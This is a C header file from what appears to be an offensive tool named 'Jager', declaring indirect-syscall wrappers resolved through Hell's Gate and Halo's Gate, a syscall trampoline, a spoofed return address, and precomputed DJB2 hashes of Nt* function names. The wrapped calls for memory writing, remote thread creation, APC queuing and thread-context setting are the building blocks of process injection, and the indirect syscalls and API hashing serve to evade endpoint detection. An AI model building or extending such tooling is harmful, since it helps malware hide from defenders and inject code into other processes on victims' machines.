#ifndef JAGER_SYSCALLS_H
#define JAGER_SYSCALLS_H

#include <windows.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

#ifdef __cplusplus
extern "C" {
#endif

/* Indirect syscall trampoline (syscalls.x64.S) */
extern __declspec(thread) WORD g_syscall_ssn;
extern __declspec(thread) PVOID g_syscall_gadget;
void syscall_trampoline(void);

/* Nt* wrappers using Hell's Gate / Halo's Gate resolution */
NTSTATUS sys_NtAllocateVirtualMemory(
    HANDLE proc, PVOID *base, SIZE_T *size, ULONG type, ULONG protect);

NTSTATUS sys_NtProtectVirtualMemory(
    HANDLE proc, PVOID *base, SIZE_T *size, ULONG new_prot, PULONG old_prot);

NTSTATUS sys_NtWriteVirtualMemory(
    HANDLE proc, PVOID base, PVOID buf, SIZE_T size, PSIZE_T written);

NTSTATUS sys_NtReadVirtualMemory(
    HANDLE proc, PVOID base, PVOID buf, SIZE_T size, PSIZE_T read);

NTSTATUS sys_NtOpenProcess(
    PHANDLE process, ACCESS_MASK access, PVOID obj_attr, PVOID client_id);

NTSTATUS sys_NtCreateThreadEx(
    PHANDLE thread, ACCESS_MASK access, PVOID obj_attr, HANDLE proc,
    PVOID start, PVOID param, ULONG flags, SIZE_T zero,
    SIZE_T commit, SIZE_T reserve, PVOID attr_list);

NTSTATUS sys_NtOpenSection(PHANDLE section, ACCESS_MASK access, PVOID obj_attr);
NTSTATUS sys_NtMapViewOfSection(
    HANDLE section, HANDLE proc, PVOID *base, ULONG_PTR zero_bits,
    SIZE_T commit, PLARGE_INTEGER offset, PSIZE_T view_size,
    DWORD inherit, ULONG alloc_type, ULONG protect);
NTSTATUS sys_NtUnmapViewOfSection(HANDLE proc, PVOID base);

NTSTATUS sys_NtCreateSection(
    PHANDLE section, ACCESS_MASK access, PVOID obj_attr, PLARGE_INTEGER max_size,
    ULONG protect, ULONG alloc_attr, HANDLE file_handle);

NTSTATUS sys_NtQueueApcThread(
    HANDLE thread, PVOID apc_routine, PVOID arg1, PVOID arg2, PVOID arg3);

NTSTATUS sys_NtFreeVirtualMemory(
    HANDLE proc, PVOID *base, PSIZE_T size, ULONG free_type);

NTSTATUS sys_NtQueryVirtualMemory(
    HANDLE proc, PVOID base, int info_class, PVOID info,
    SIZE_T info_len, PSIZE_T ret_len);

NTSTATUS sys_NtSetContextThread(HANDLE thread, PCONTEXT ctx);
NTSTATUS sys_NtGetContextThread(HANDLE thread, PCONTEXT ctx);

NTSTATUS sys_NtResumeThread(HANDLE thread, PULONG prev_suspend_count);
NTSTATUS sys_NtSuspendThread(HANDLE thread, PULONG prev_suspend_count);

NTSTATUS sys_NtDuplicateObject(
    HANDLE src_proc, HANDLE src_handle, HANDLE tgt_proc, PHANDLE tgt_handle,
    ACCESS_MASK access, ULONG handle_attrs, ULONG options);

NTSTATUS sys_NtQueryInformationProcess(
    HANDLE proc, ULONG info_class, PVOID info, ULONG info_len, PULONG ret_len);

NTSTATUS sys_NtTerminateProcess(HANDLE proc, NTSTATUS exit_status);
NTSTATUS sys_NtDelayExecution(BOOLEAN alertable, PLARGE_INTEGER delay);

BOOL jager_protect_memory(HANDLE proc, PVOID addr, SIZE_T size, ULONG prot, PULONG old);

extern PVOID g_spoof_return_addr;

/* Pre-computed DJB2 hashes for Nt* exports */
#define HASH_NtAllocateVirtualMemory  0x6793C34CU
#define HASH_NtProtectVirtualMemory   0x082962C8U
#define HASH_NtWriteVirtualMemory      0x95F3A792U
#define HASH_NtReadVirtualMemory       0xC24062E3U
#define HASH_NtOpenProcess             0x5003C058U
#define HASH_NtCreateThreadEx          0xCB0C2130U
#define HASH_NtOpenSection             0x17CFA34EU
#define HASH_NtMapViewOfSection        0x231F196AU
#define HASH_NtUnmapViewOfSection      0x595014ADU
#define HASH_NtCreateSection           0xD02E20D0U
#define HASH_NtQueueApcThread          0xD4612238U
#define HASH_NtFreeVirtualMemory       0x471AA7E9U
#define HASH_NtQueryVirtualMemory      0xE39D8E5DU
#define HASH_NtSetContextThread        0x308BE0D0U
#define HASH_NtGetContextThread        0x9E0E1A44U
#define HASH_NtResumeThread            0x2C7B3D30U
#define HASH_NtSuspendThread           0x50FEBD61U
#define HASH_NtDuplicateObject         0x2388EE19U
#define HASH_NtQueryInformationProcess 0xD034FC62U
#define HASH_NtTerminateProcess        0x1703AB2FU
#define HASH_NtDelayExecution          0x0A49084AU

#ifdef __cplusplus
}
#endif

#endif /* JAGER_SYSCALLS_H */
